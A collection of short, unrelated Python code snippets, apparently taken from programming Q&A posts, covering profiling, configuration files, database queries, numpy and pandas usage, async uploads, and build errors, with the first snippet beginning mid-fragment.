_refreshOrder ) 1 0.002 0.002 0.006 0.006 { sorted } 4050 0.003 0.000 0.004 0.000 bolt.py:1040 ( __cmp__ ) # here is the custom object 4050 0.001 0.000 0.001 0.000 { cmp } 4050 0.000 0.000 0.000 0.000 { isinstance } 1 0.000 0.000 0.000 0.000 { method 'sort ' of 'list ' objects } 291 0.000 0.000 0.000 0.000 __init__.py:6537 ( < lambda > ) 291 0.000 0.000 0.000 0.000 { method 'append ' of 'list ' objects } 1 0.000 0.000 0.000 0.000 bolt.py:1240 ( iteritems ) 1 0.000 0.000 0.000 0.000 { method 'iteritems ' of 'dict ' objects } 1 0.000 0.000 0.000 0.000 { method 'disable ' of '_lsprof.Profiler ' objects } 7027 function calls in 0.004 seconds Ordered by : cumulative time ncalls tottime percall cumtime percall filename : lineno ( function ) 1 0.000 0.000 0.004 0.004 < string > :1 ( < module > ) 1 0.000 0.000 0.004 0.004 __init__.py:6527 ( _refreshOrder ) 1 0.001 0.001 0.003 0.003 { sorted } 2049 0.001 0.000 0.002 0.000 bolt.py:1040 ( __cmp__ ) 2049 0.000 0.000 0.000 0.000 { cmp } 2049 0.000 0.000 0.000 0.000 { isinstance } 1 0.000 0.000 0.000 0.000 { method 'sort ' of 'list ' objects } 291 0.000 0.000 0.000 0.000 __init__.py:6538 ( < lambda > ) 291 0.000 0.000 0.000 0.000 __init__.py:6533 ( < lambda > ) 291 0.000 0.000 0.000 0.000 { method 'append ' of 'list ' objects } 1 0.000 0.000 0.000 0.000 bolt.py:1240 ( iteritems ) 1 0.000 0.000 0.000 0.000 { method 'iteritems ' of 'dict ' objects } 1 0.000 0.000 0.000 0.000 { method 'disable ' of '_lsprof.Profiler ' objects }"
"from pynput.keyboard import Keyfrom pynput.keyboard import Controller as Contfrom pynput.mouse import Button , Controllerimport timemouse = Controller ( ) keyboard = Cont ( ) with keyboard.pressed ( Key.shift ) : mouse.position = ( 1892 , 838 ) mouse.click ( Button.left ) import pyautoguipyautogui.keyDown ( 'shift ' ) pyautogui.click ( ) pyautogui.keyUp ( 'shift ' )"
a = 1000b = 1000print ( a is b ) # prints False a = 1000b = 1000print ( a is b ) # prints True
try : foo ( ) except ( ErrorTypeA ) : bar ( ) foobar ( ) except ( ErrorTypeB ) : baz ( ) foobar ( ) except ( SwineFlu ) : print 'You have caught Swine Flu ! ' foobar ( ) except : foobar ( )
import libpyExamplelibpyExample.hello_world ( ) import pyExample
"os : - linuxsudo : falselanguage : pythonpython : - `` 3.3 '' - `` 3.4 '' - `` 3.5 '' - `` pypy3 '' - `` pypy3.3-5.2-alpha1 '' - `` nightly '' install : pip install tox-travisscript : tox [ tox ] envlist = py33 , py34 , py35 , pypy3 , docs , flake8 , nightly , pypy3.3-5.2-alpha1 [ tox : travis ] 3.5 = py35 , docs , flake8 [ testenv ] deps = -rrequirements.txtplatform = win : windows linux : linuxcommands = py.test -- cov=pyCardDeck -- durations=10 tests [ testenv : py35 ] commands = py.test -- cov=pyCardDeck -- durations=10 tests codeclimate-test-reporter -- file .coveragepassenv = CODECLIMATE_REPO_TOKEN TRAVIS_BRANCH TRAVIS_JOB_ID TRAVIS_PULL_REQUEST CI_NAME script : - 'if [ `` $ TRAVIS_PULL_REQUEST '' ! = `` false '' ] ; then bash ./travis/run_on_pull_requests ; fi ' - 'if [ `` $ TRAVIS_PULL_REQUEST '' = `` false '' ] ; then bash ./travis/run_on_non_pull_requests ; fi '"
"class Unit ( float ) : '' '' '' provide a simple unit converter for a given quantity '' '' '' def __new__ ( cls , unit , num=1 . ) : return super ( Unit , cls ) .__new__ ( cls , num ) def __init__ ( self , unit , num=1 . ) : `` '' '' set up base unit '' '' '' self.unit = unit def __str__ ( self , ) : return ' { : s } { : s } '.format ( super ( Unit , self ) .__str__ ( ) , self.unit ) def __rmul__ ( self , other ) : print 'rmul : { : f } '.format ( super ( Unit , self ) .__rmul__ ( other ) ) return Unit ( self.unit , super ( Unit , self ) .__rmul__ ( other ) ) def to ( self , target ) : fun_conv = _conv ( self.unit , target ) return Unit ( target , num=fun_conv ( self ) ) c = 3e8 * Unit ( 'm/s ' ) # this will 1 ) create a Unit instance with magnitude ' 1 ' and unit 'm/s ' , # 2 ) invoke __rmul__ to return a new instance with number 3e8 and unit 'm/s ' to variable ' c'print c.to ( 'km/s ' ) # returns 3e5 km/s velocities = np.array ( [ 20 , 10 ] ) * Unit ( 'm/s ' )"
"[ ' 1 ' , ' 3 ' , ' 4 ' , ' 4 ' ] if `` 1 '' and `` 2 '' and `` 3 '' in columns : print `` 1 , 2 and 3 '' 1 , 2 and 3"
"session = ftplib.FTP ( authData [ 0 ] , authData [ 1 ] , authData [ 2 ] ) session.cwd ( `` // '' +serverCatalog ( ) + '' // '' ) # open server catalogfile = open ( fileName ( ) , 'rb ' ) with open ( fileName ( ) , 'rb ' ) as f : f = f.readlines ( ) for line in f : collected = line # In some way open server file , write lines to it session.storbinary ( 'STOR ' + fileName ( ) , open ( fileName ( ) , ' a ' ) , 1024 ) file.close ( ) session.quit ( ) session.cwd ( `` // '' +serverCatalog ( ) + '' // '' ) # open server cataloglocalfile = open ( `` logfile.txt '' , 'rb ' ) session.storbinary ( 'APPE serverfile.txt ' , localfile ) localfile.close ( )"
"CAR_MAKES = [ ( '-1 ' , `` Please select a vehicle make ... '' ) , ( 1 , 'Honda ' ) , ( 2 , 'Ford ' ) , ( 3 , 'BMW ' ) ] dd_car_makes = SelectField ( 'dd_car_makes ' , choices=CAR_MAKES , validators= [ DataRequired ( ) ] )"
"a = np.arange ( 1 , 11 , dtype = 'float32 ' ) np.divide ( 1.0 , a , out = a ) array ( [ 1. , 0.5 , 0.33333334 , 0.25 , 0.2 , 0.16666667 , 0.14285715 , 0.125 , 0.11111111 , 0.1 ] , dtype=float32 ) torch.div ( 1.0 , a , out = a )"
"CONSTANCE_CONFIG = { 'ADMINS ' : ( [ ( 'Errors ' , 'admin @ gmail.com ' ) ] , 'Admin Emails ' ) , } MANAGER = CONSTANCE_CONFIG [ 'ADMINS ' ] [ 0 ]"
"def gen ( ) : ... . for hit in results : yield hit for one , two in gen ( ) : ..."
"import osimport aiohttpfrom aiohttp.client import ClientSessionBASE_DIR = '/path/to'ARCHIVE_DIR = '/path/to/archive'async def scan ( ) : while True : await asyncio.sleep ( 1 ) for file in os.listdir ( BASE_DIR ) : if os.path.join ( BASE_DIR , file ) .endswith ( 'jpg ' ) : asyncio.ensure_future ( publish_file ( file ) ) async def publish_file ( file ) : async with ClientSession ( loop=loop ) as session : async with session.post ( url=url , data= { 'photo ' : open ( os.path.join ( BASE_DIR , file ) , 'rb ' ) } ) as response : if response.status == 200 : await move_to_archive ( file ) async def move_to_archive ( file ) : os.rename ( os.path.join ( BASE_DIR , file ) , os.path.join ( ARCHIVE_DIR , file ) ) loop = asyncio.get_event_loop ( ) coros = [ asyncio.ensure_future ( scan ( ) ) ] loop.run_until_complete ( asyncio.wait ( coros ) )"
"a = pd.DataFrame ( { 'foo ' : [ 'm ' , 'm ' , 'm ' , 's ' , 's ' , 's ' ] , 'bar ' : [ 1 , 2 , 3 , 4 , 5 , 6 ] } ) > > > a bar foo0 1 m1 2 m2 3 m3 4 s4 5 s5 6 s b = pd.DataFrame ( { 'm ' : [ 1 , 2 , 3 ] , 's ' : [ 4 , 5 , 6 ] } ) > > > b m s0 1 41 2 52 3 6"
"def calc ( oprands , result ) : ret= [ ] if len ( oprands ) ==1 : if oprands [ 0 ] ! =result : return ret else : ret.append ( str ( oprands [ 0 ] ) ) return ret for idx , x in enumerate ( oprands ) : if x in oprands [ 0 : idx ] : continue remaining=oprands [ 0 : idx ] +oprands [ idx+1 : ] temp = calc ( remaining , result-x ) # try addition for s in temp : ret.append ( str ( x ) + ' + ' + s ) if ( result % x == 0 ) : # try multiplication temp = calc ( remaining , result/x ) for s in temp : ret.append ( str ( x ) + ' * ( ' + s + ' ) ' ) temp = calc ( remaining , result+x ) # try subtraction for s in temp : ret.append ( s + ' - ' + str ( x ) ) temp = calc ( remaining , x-result ) for s in temp : ret.append ( str ( x ) + ' - ( ' + s + ' ) ' ) temp = calc ( remaining , result*x ) # try division for s in temp : ret.append ( ' ( ' + s + ' ) / ' + str ( x ) ) if result ! =0 and x % result==0 and x/result ! =0 : temp = calc ( remaining , x/result ) for s in temp : ret.append ( str ( x ) + ' / ' + ' ( ' +s + ' ) ' ) return retif __name__ == '__main__ ' : nums = raw_input ( `` Please input numbers seperated by space : `` ) rslt = int ( raw_input ( `` Please input result : `` ) ) oprds = map ( int , nums.split ( ' ' ) ) rr = calc ( oprds , rslt ) for s in rr : print s print 'calculate { 0 } from { 1 } , there are altogether { 2 } solutions . '.format ( rslt , oprds , len ( rr ) )"
"db = sqlite3.connect ( 'mydb ' ) cursor = db.cursor ( ) cursor.execute ( `` ' CREATE TABLE orders ( id INTEGER PRIMARY KEY , product_id INTEGER , client_id INTEGER ) `` ' ) cursor.execute ( `` ' CREATE TABLE clients ( id INTEGER PRIMARY KEY , gender TEXT , city TEXT ) `` ' ) cursor.execute ( `` ' CREATE TABLE products ( id INTEGER PRIMARY KEY , category_name TEXT ) `` ' ) orders = [ ( 9 , 6 ) , ( 3 , 10 ) , ( 8 , 6 ) , ( 4 , 8 ) , ( 5 , 6 ) , ( 7 , 4 ) , ( 9 , 2 ) , ( 10 , 8 ) , ( 4 , 6 ) , ( 3 , 1 ) , ( 10 , 2 ) , ( 9 , 8 ) , ( 9 , 7 ) , ( 4 , 9 ) , ( 7 , 10 ) , ( 2 , 7 ) , ( 4 , 7 ) , ( 6 , 2 ) , ( 6 , 2 ) , ( 9 , 3 ) , ( 10 , 6 ) , ( 4 , 4 ) , ( 2 , 6 ) , ( 3 , 8 ) , ( 9 , 2 ) , ( 1 , 9 ) , ( 3 , 9 ) , ( 9 , 4 ) , ( 5 , 5 ) , ( 7 , 1 ) , ( 8 , 7 ) , ( 7 , 8 ) , ( 6 , 3 ) , ( 9 , 6 ) , ( 8 , 3 ) , ( 7 , 1 ) , ( 10 , 5 ) , ( 7 , 10 ) , ( 8 , 1 ) , ( 7 , 9 ) , ( 4 , 4 ) , ( 3 , 8 ) , ( 5 , 2 ) , ( 5 , 8 ) , ( 6 , 10 ) , ( 9 , 7 ) , ( 2 , 2 ) , ( 4 , 10 ) , ( 5 , 10 ) , ( 3 , 9 ) ] clients = [ ( 'Male ' , 'NY ' ) , ( 'Female ' , 'NY ' ) , ( 'Male ' , 'London ' ) , ( 'Male ' , 'London ' ) , ( 'Male ' , 'NY ' ) , ( 'Female ' , 'NY ' ) , ( 'Female ' , 'London ' ) , ( 'Male ' , 'London ' ) , ( 'Male ' , 'NY ' ) , ( 'Female ' , 'London ' ) ] products = [ ( 'Kitchen ' , ) , ( 'Sport ' , ) , ( 'Furniture ' , ) , ( 'Furniture ' , ) , ( 'Furniture ' , ) , ( 'Sport ' , ) , ( 'Sport ' , ) , ( 'Kitchen ' , ) , ( 'Kitchen ' , ) , ( 'Kitchen ' , ) ] cursor.executemany ( `` INSERT INTO orders ( product_id , client_id ) VALUES ( ? , ? ) '' , orders ) cursor.executemany ( `` INSERT INTO clients ( gender , city ) VALUES ( ? , ? ) '' , clients ) cursor.executemany ( `` INSERT INTO products ( category_name ) VALUES ( ? ) '' , ( products ) ) db.commit ( ) cursor.execute ( `` ' SELECT category_name , city , gender , product_id , COUNT ( product_id ) FROM orders LEFT JOIN products ON product_id = products.id LEFT JOIN clients ON client_id = clients.id GROUP BY product_id , category_name , city , gender ORDER BY category_name , city , gender , COUNT ( product_id ) DESC `` ' ) print ( `` 'category_name , city , gender , product_id , COUNT ( product_id ) ' '' ) all_rows = cursor.fetchall ( ) for a , b , c , d , e in all_rows : print ( a , b , c , d , e ) db.close ( )"
"> > > xmasked_array ( data = [ 1 2 -- 4 ] , mask = [ False False True False ] , fill_value = 999999 ) > > > ymasked_array ( data = [ 4 -- 0 4 ] , mask = [ False True False False ] , fill_value = 999999 ) > > > x/ymasked_array ( data = [ 0.25 -- -- 1.0 ] , mask = [ False True True False ] , fill_value = 1e+20 ) > > > def div ( a , b ) : return a/b > > > div ( x , y ) masked_array ( data = [ 0.25 -- -- 1.0 ] , mask = [ False True True False ] , fill_value = 1e+20 ) > > > np.vectorize ( div ) ( x , y ) Traceback ( most recent call last ) : File `` < input > '' , line 1 , in < module > File `` /usr/lib64/python3.4/site-packages/numpy/lib/function_base.py '' , line 1811 , in __call__ return self._vectorize_call ( func=func , args=vargs ) File `` /usr/lib64/python3.4/site-packages/numpy/lib/function_base.py '' , line 1880 , in _vectorize_call outputs = ufunc ( *inputs ) File `` < input > '' , line 2 , in divZeroDivisionError : division by zero"
@ contextmanagerdef connect ( my_session_factory ) : session = scoped_session ( my_session_factory ) try : yield session except Exception as exception : session.rollback ( ) raise exception finally : session.close ( ) from sqlalchemy.orm import Queryquery = Query ( my_model ) .offset ( my_offset ) .limit ( my_limit ) with connect ( my_session_factory ) as session : instances = query.with_session ( session ) .all ( ) return instances
"import itertoolsdef dynamic_grouper ( iterable , intervals ) : for i in intervals : inner_iter = list ( itertools.islice ( iterable , i ) ) # this is a `` group '' yield inner_iteriterable = iter ( xrange ( 100 ) ) chunk_sizes = [ 22,30,38,10 ] for i , group in enumerate ( dynamic_grouper ( iterable , chunk_sizes ) ) : args = [ iter ( group ) ] * 5 for item in itertools.izip_longest ( fillvalue=None , *args ) : print `` Group % i '' % i print `` Items % s '' % list ( item )"
"class Message ( models.Model ) : sender = models.ForeignKey ( User , null=True , blank=True ) sender_name = models.CharField ( max_length=255 ) def my_signal_handler ( sender , instance , **kwargs ) : instance.message_set.clear ( ) pre_delete.connect ( my_signal_handler , sender=User )"
"print ( ) print ( __name__ ) print ( __name__=='__main__ ' ) if __name__ == '__main__ ' : print ( `` indeed '' ) Python 3.3.5 ( default , Mar 18 2014 , 02:00:02 ) [ GCC 4.2.1 20070831 patched [ FreeBSD ] ] on freebsd9Type `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > __main__True > > >"
page1.phppage2.php page3.py page4.jsp
import lxml.html.cleancleaner = lxml.html.clean.Cleaner ( ) < span style= '' color : # 008800 ; '' > 67.51 < /span > < span > 67.51 < /span > cleaner.style= False
"result += ' % s ' % ( < complexExpressionForGettingX > ) if < complexExpressionForGettingX > else `` f ( e ( ) ) if e ( ) else somedefault ( lambda e : ' % s ' % e if e else `` ) ( < complexExpressionForGettingX > ) def conditional ( expr , formatStringIfTrue , default= '' )"
"f = open ( 'input.txt ' , ' r ' ) arr = [ ] for i in range ( 0 , 15 ) : arr.append ( [ ] ) str = f.readline ( ) a = str.split ( ' ' ) for tok in a : arr [ i ] .append ( int ( tok [ :2 ] ) ) print arr"
"> > > class A ( object ) : pass ... > > > class B ( A ) : pass ... > > > class C ( B ) : pass ... > > > B.__bases__ ( < class '__main__.A ' > , ) > > > B.__bases__ = ( C , ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > TypeError : a __bases__ item causes an inheritance cycle > > >"
"Year = r ' [ 12 ] \d { 3 } 'Month = r'Jan|Feb|Mar'Day = r'\d { 2 } 'HourMins = r'\d { 2 } : \d { 2 } 'Date = r ' % s % s , % s , % s ' % ( Month , Day , Year , HourMins ) DateR = re.compile ( Date )"
"foo = SomeClass ( ) ... attr = `` names '' value = `` Eric '' values = getattr ( foo , attr ) values.append ( value ) setattr ( foo , attr , values )"
webdriver.DesiredCapabilities.PHANTOMJS [ 'phantomjs.page.customHeaders.referer ' ] = referer webdriver.DesiredCapabilities.PHANTOMJS [ 'phantomjs.page.onInitialized ' ] = `` '' '' function ( ) { page.customHeaders = { } ; } ; '' '' ''
"import osfrom tornado import ioloop , genimport tornadoredisprint os.getpid ( ) def on_message ( msg ) : print msg @ gen.enginedef listen ( ) : c = tornadoredis.Client ( ) c.connect ( ) yield gen.Task ( c.subscribe , 'channel ' ) c.listen ( on_message ) listen ( ) ioloop.IOLoop.instance ( ) .start ( ) import osfrom pympler import trackerfrom tornado import ioloop , genimport tornadoredisprint os.getpid ( ) class MessageHandler ( object ) : def __init__ ( self ) : self.memory_tracker = tracker.SummaryTracker ( ) def on_message ( self , msg ) : self.memory_tracker.print_diff ( ) @ gen.enginedef listen ( ) : c = tornadoredis.Client ( ) c.connect ( ) yield gen.Task ( c.subscribe , 'channel ' ) c.listen ( MessageHandler ( ) .on_message ) listen ( ) ioloop.IOLoop.instance ( ) .start ( ) types | # objects | total size===================================================== | =========== | ============ dict | 32 | 14.75 KB tuple | 41 | 3.66 KB set | 8 | 1.81 KB instancemethod | 16 | 1.25 KB cell | 22 | 1.20 KB function ( handle_exception ) | 8 | 960 B function ( inner ) | 7 | 840 B generator | 8 | 640 B < class 'tornado.gen.Task | 8 | 512 B < class 'tornado.gen.Runner | 8 | 512 B < class 'tornado.stack_context.ExceptionStackContext | 8 | 512 B list | 3 | 504 B str | 7 | 353 B int | 7 | 168 B builtin_function_or_method | 2 | 144 B types | # objects | total size===================================================== | =========== | ============ dict | 32 | 14.75 KB tuple | 42 | 4.23 KB set | 8 | 1.81 KB cell | 24 | 1.31 KB instancemethod | 16 | 1.25 KB function ( handle_exception ) | 8 | 960 B function ( inner ) | 8 | 960 B generator | 8 | 640 B < class 'tornado.gen.Task | 8 | 512 B < class 'tornado.gen.Runner | 8 | 512 B < class 'tornado.stack_context.ExceptionStackContext | 8 | 512 B object | 8 | 128 B str | 2 | 116 B int | 1 | 24 B types | # objects | total size===================================================== | =========== | ============ dict | 32 | 14.75 KB tuple | 42 | 4.73 KB set | 8 | 1.81 KB cell | 24 | 1.31 KB instancemethod | 16 | 1.25 KB function ( handle_exception ) | 8 | 960 B function ( inner ) | 8 | 960 B generator | 8 | 640 B < class 'tornado.gen.Task | 8 | 512 B < class 'tornado.gen.Runner | 8 | 512 B < class 'tornado.stack_context.ExceptionStackContext | 8 | 512 B list | 0 | 240 B object | 8 | 128 B int | -1 | -24 B str | 0 | -34 B"
"A + B = 8 B + D = 8 A + C = 13 C - D = 6 a = range ( 0,14 ) b = c = d = a for i in a : for x in b : for y in c : for z in d : if ( a [ i ] + b [ x ] == 8 and a [ i ] + c [ y ] == 13 and b [ x ] + d [ z ] == 8 and c [ y ] -d [ z ] ==6 ) : print ( a [ i ] , b [ x ] , c [ y ] , d [ z ] )"
"import timedef test ( n , seq ) : for method in ( set , list , tuple ) : t = time.time ( ) for i in range ( n ) : method ( seq ) print ( method.__name__ , ( time.time ( ) - t ) ) someFilter = filter ( lambda x : x % 3 == 0 , range ( 1000 ) ) test ( 10000000 , someFilter ) set 1.9240000247955322list 8.82200002670288tuple 7.031999826431274 import timedef testFilter ( n , test , rangeSize ) : for method in ( set , list , tuple ) : t = time.time ( ) for i in range ( n ) : method ( filter ( test , range ( rangeSize ) ) ) print ( method.__name__ , ( time.time ( ) - t ) ) testFilter ( 100000 , lambda x : x % 3 == 0 , 1000 ) set 27.868000030517578list 27.131999969482422tuple 27.138000011444092"
"import sysclass Foo ( object ) : def __init__ ( self , a , b ) : self.a = a self.b = bf = Foo ( 20 , 30 ) > > > sys.getsizeof ( vars ( f ) ) # vars gets obj.__dict__96 > > > sys.getsizeof ( dict ( vars ( f ) ) 288 > > > sys.getsizeof ( vars ( f ) ) 280 > > > sys.getsizeof ( dict ( vars ( f ) ) ) 280 > > > vars ( f ) == dict ( vars ( f ) ) True"
"y= [ ( 1,2 ) , ( 2,3 ) , ( 1,2 ) , ( 5,6 ) ] dict= { } for tup in y : tup=tuple ( sorted ( tup ) ) if tup in dict.keys ( ) : dict [ tup ] =dict [ tup ] +1 else : dict [ tup ] =1"
"from pyramid.security import unauthenticated_useriddef get_user ( request ) : # the below line is just an example , use your own method of # accessing a database connection here ( this could even be another # request property such as request.db , implemented using this same # pattern ) . dbconn = request.registry.settings [ 'dbconn ' ] userid = unauthenticated_userid ( request ) if userid is not None : # this should return None if the user does n't exist # in the database return dbconn [ 'users ' ] .query ( { 'id ' : userid } ) userid = authenticated_userid ( request )"
class foo : # old style class foo ( object ) : # new style
"py : :class_ < Raster > ( m , `` Raster '' ) .def ( py : :init < double* , std : :size_t , std : :size_t , std : :size_t , double , double , double > ( ) ) ; py : :class_ < Raster > ( m , `` Raster '' , py : :buffer_protocol ( ) ) .def ( `` __init__ '' , [ ] ( Raster & raster , py : :array_t < double > buffer , double spacingX , double spacingY , double spacingZ ) { py : :buffer_info info = buffer.request ( ) ; new ( & raster ) Raster3D ( static_cast < double* > ( info.ptr ) , info.shape [ 0 ] , info.shape [ 1 ] , info.shape [ 2 ] , spacingX , spacingY , spacingZ ) ; } )"
"list_a = [ ( 1,2 ) , ( 1,2 ) , ( 1,2 ) , ... ] list_b = [ 3 , 3 , 3 , ... ] > > > for a , b , c , in funky_zip ( list_a , list_b ) : > > > print ( a , b , c ) ... 1 2 31 2 31 2 3 # and so on for aa , b in zip ( list_a , list_b ) : print ( aa [ 0 ] , aa [ 1 ] , b )"
"1 > -- -- -- Build started : Project : ZERO_CHECK , Configuration : Release Win32 -- -- -- 2 > -- -- -- Build started : Project : freenect , Configuration : Release Win32 -- -- -- 2 > Creating library C : /IvoPython/Kinect/Driver/lib/Release/freenect.lib and object C : /IvoPython/Kinect/Driver/lib/Release/freenect.exp2 > freenect.vcxproj - > C : \IvoPython\Kinect\Driver\Release\freenect.dll3 > -- -- -- Build started : Project : freenect_sync , Configuration : Release Win32 -- -- -- 3 > Creating library C : /IvoPython/Kinect/Driver/lib/Release/freenect_sync.lib and object C : /IvoPython/Kinect/Driver/lib/Release/freenect_sync.exp3 > freenect_sync.vcxproj - > C : \IvoPython\Kinect\Driver\Release\freenect_sync.dll4 > -- -- -- Build started : Project : cython_freenect , Configuration : Release Win32 -- -- -- 4 > LINK : fatal error LNK1149 : output filename matches input filename ' C : \IvoPython\Kinect\Driver\lib\Release\freenect.lib'========== Build : 3 succeeded , 1 failed , 0 up-to-date , 0 skipped =========="
"from http.cookiejar import CookieJarfrom urllib import requestcj = CookieJar ( ) cp = request.HTTPCookieProcessor ( cj ) hh = request.HTTPHandler ( ) opener = request.build_opener ( cp , hh ) while True : # build url req = request.Request ( url=url ) p = opener.open ( req ) c = p.read ( ) # process c p.close ( ) # check for abort condition , or continue"
"import numpy as npimport matplotlib.pyplot as plt # Red line data.x1 = [ 0.01 , 0.04 , 0.08 , 0.11 , 0.15 , 0.18 , 0.22 , 0.25 , 0.29 , 0.32 , 0.35 , 0.38 , 0.41 , 0.44 , 0.46 , 0.49 , 0.51 , 0.54 , 0.56 , 0.58 ] y1 = [ 2.04 , 2.14 , 2.24 , 2.34 , 2.44 , 2.54 , 2.64 , 2.74 , 2.84 , 2.94 , 3.04 , 3.14 , 3.24 , 3.34 , 3.44 , 3.54 , 3.64 , 3.74 , 3.84 , 3.94 ] # Blue line data.x2 = [ 0.4634 , 0.4497 , 0.4375 , 0.4268 , 0.4175 , 0.4095 , 0.4027 , 0.3971 , 0.3925 , 0.389 , 0.3865 , 0.3848 , 0.384 , 0.3839 , 0.3845 , 0.3857 , 0.3874 , 0.3896 , 0.3922 , 0.3951 , 0.3982 , 0.4016 , 0.405 , 0.4085 , 0.412 , 0.4154 , 0.4186 , 0.4215 , 0.4242 , 0.4265 , 0.4283 , 0.4297 , 0.4304 , 0.4305 , 0.4298 , 0.4284 , 0.4261 , 0.4228 , 0.4185 , 0.4132 , 0.4067 , 0.399 , 0.39 , 0.3796 , 0.3679 , 0.3546 , 0.3397 , 0.3232 , 0.305 , 0.285 ] y2 = [ 1.0252 , 1.0593 , 1.0934 , 1.1275 , 1.1616 , 1.1957 , 1.2298 , 1.2639 , 1.298 , 1.3321 , 1.3662 , 1.4003 , 1.4344 , 1.4685 , 1.5026 , 1.5367 , 1.5708 , 1.6049 , 1.639 , 1.6731 , 1.7072 , 1.7413 , 1.7754 , 1.8095 , 1.8436 , 1.8776 , 1.9117 , 1.9458 , 1.9799 , 2.014 , 2.0481 , 2.0822 , 2.1163 , 2.1504 , 2.1845 , 2.2186 , 2.2527 , 2.2868 , 2.3209 , 2.355 , 2.3891 , 2.4232 , 2.4573 , 2.4914 , 2.5255 , 2.5596 , 2.5937 , 2.6278 , 2.6619 , 2.696 ] x3 , y3 = [ ] , [ ] # Store a small section of the blue line in these new lists : only those points # closer than 0.2 to the last point in this line.for indx , y2_i in enumerate ( y2 ) : if ( y2 [ -1 ] -y2_i ) < =0.2 : y3.append ( y2_i ) x3.append ( x2 [ indx ] ) # The same as above but for the red line : store only those points between # 0. and 0.4 in the y axis and with a larger x value than the last point in the # blue line.for indx , y1_i in enumerate ( y1 ) : if 0 . < ( y1_i-y2 [ -1 ] ) < =0.4 and x1 [ indx ] > x2 [ -1 ] : y3.append ( y1_i ) x3.append ( x1 [ indx ] ) # Find interpolating curve that joins both segments stored in x3 , y3.poli_order = 3 # Order of the polynome.poli = np.polyfit ( y3 , x3 , poli_order ) y_pol = np.linspace ( min ( y3 ) , max ( y3 ) , 50 ) p = np.poly1d ( poli ) x_pol = [ p ( i ) for i in y_pol ] plt.plot ( x1 , y1 , ' r ' ) plt.plot ( x2 , y2 , ' b ' ) plt.plot ( x_pol , y_pol , ' g ' ) plt.scatter ( x3 , y3 , c= ' k ' ) plt.show ( )"
AssertionError : Expected call : filter ( < sqlalchemy.sql.elements.BinaryExpression object at 0x1037607d0 > ) Actual call : filter ( < sqlalchemy.sql.elements.BinaryExpression object at 0x1037590d0 > )
def sillyGenerator ( ) : for i in xrange ( 10 ) : yield i*i for i in xrange ( 12 ) : yield i*i for i in xrange ( 8 ) : yield i*i def quadraticRange ( n ) : for i in xrange ( n ) yield i*idef sillyGenerator ( ) : quadraticRange ( 10 ) quadraticRange ( 12 ) quadraticRange ( 8 ) def sillyGenerator ( ) : for i in quadraticRange ( 10 ) : yield i for i in quadraticRange ( 12 ) : yield i for i in quadraticRange ( 8 ) : yield i def sillyGeneratorRevisited ( ) : g = subgenerator ( ) v = None try : while True : v = yield g.send ( v ) catch StopIteration : pass if v < 4 : # ... else : # ... def sillyGenerator ( ) : yield from quadraticRange ( 10 ) yield from quadraticRange ( 12 ) yield from quadraticRange ( 8 ) def sillyGeneratorRevisited ( ) : v = yield from subgenerator ( ) if v < 4 : # ... else : # ...
"from django.middleware.csrf import get_tokenclass ForceCsrfCookieMiddleware ( object ) : def process_request ( self , request ) : get_token ( request )"
"[ buildout ] parts = zope [ zope ] recipe = plone.recipe.zope2installeggs = An internal error occured due to a bug in either zc.buildout or in arecipe being used : Traceback ( most recent call last ) : File `` /tmp/tmp2wqykW/zc.buildout-1.3.0-py2.4.egg/zc/buildout/buildout.py '' , line 1519 , in main File `` /tmp/tmp2wqykW/zc.buildout-1.3.0-py2.4.egg/zc/buildout/buildout.py '' , line 357 , in install File `` /tmp/tmp2wqykW/zc.buildout-1.3.0-py2.4.egg/zc/buildout/buildout.py '' , line 898 , in __getitem__ File `` /tmp/tmp2wqykW/zc.buildout-1.3.0-py2.4.egg/zc/buildout/buildout.py '' , line 982 , in _initialize File `` /home/analyser/site/eggs/plone.recipe.zope2install-3.1-py2.4.egg/plone/recipe/zope2install/__init__.py '' , line 73 , in __init__ assert self.location or self.svn or self.urlAssertionError"
"import serialser = serial.Serial ( port='/dev/hidraw4 ' ) serial.serialutil.SerialException : Could not configure port : ( 22 , 'Invalid argument ' )"
`` D : \software\SublimeText 3_x64\sublime_text.exe '' % comspec % /k `` '' C : \Program Files ( x86 ) \Microsoft Visual Studio 14.0\VC\vcvarsall.bat '' '' amd64 sublime_text cmd /k `` '' C : \Program Files ( x86 ) \Microsoft Visual Studio 14.0\VC\vcvarsall.bat '' '' amd64 % comspec % /k `` '' C : \Program Files ( x86 ) \Microsoft Visual Studio 14.0\VC\vcvarsall.bat '' '' amd64sublime_text % comspec % /k `` '' C : \Program Files ( x86 ) \Microsoft Visual Studio 14.0\VC\vcvarsall.bat '' '' amd64 & & sublime_text % comspec % /k `` '' C : \Program Files ( x86 ) \Microsoft Visual Studio 14.0\VC\vcvarsall.bat '' '' amd64 & sublime_text { vs2015 } : cmd.exe /k `` C : \Program Files ( x86 ) \Microsoft Visual Studio 14.0\VC\vcvarsall.bat '' amd64 & sublime_text D : \software\ConEmuPack.151205\ConEmu64.exe /single -cmd { vs2015 }
# request # GET http : //localhost:8888/static/tree/js/main.min.js ? v=04a28c5e21950738efb217191f08ac33 # request # GET http : //localhost:8888/api/terminals ? _=1441754529652 # request # GET http : //localhost:8888/custom/custom.js ? v=20150908160654 # request # GET http : //localhost:8888/notebooks/Untitled1.ipynb ? kernel_name=python3 # # request # GET http : //localhost:8888/ipython/static/tree/js/main.min.js ? v=04a28c5e21950738efb217191f08ac33 # request # GET http : //localhost:8888/ipython/api/terminals ? _=1441754529652 # request # GET http : //localhost:8888/ipython/custom/custom.js ? v=20150908160654 # request # GET http : //localhost:8888/ipython/notebooks/Untitled1.ipynb ? kernel_name=python3 #
"[ ( 1,2 ) , ( 1,3 ) , ( 2,1 ) ] { ( 1,2 ) , ( 1,3 ) }"
